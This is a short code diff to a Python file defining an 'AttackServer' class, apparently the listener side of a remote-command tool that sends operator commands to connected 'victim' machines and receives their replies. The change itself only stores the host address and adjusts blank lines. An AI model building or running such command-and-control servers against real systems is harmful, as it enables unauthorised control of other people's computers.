@@ -2,10 +2,10 @@ import socket
 import threading
 
 
-
 class AttackServer:
     def __init__(self, host = '0.0.0.0', port = 5050):
         self.ADDR = (host,port)
+        self.IP = host
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.bind(self.ADDR)
         self.LISTENING_LIMIT = 5
@@ -23,6 +23,12 @@ class AttackServer:
                 break
             client_socket.send(command.encode(self.FORMAT))
             print(f"[SENDING] sending command to {addr}")
+
+
+
+
+
+
 
 
     def receive_from_victim(self,client_socket,addr):
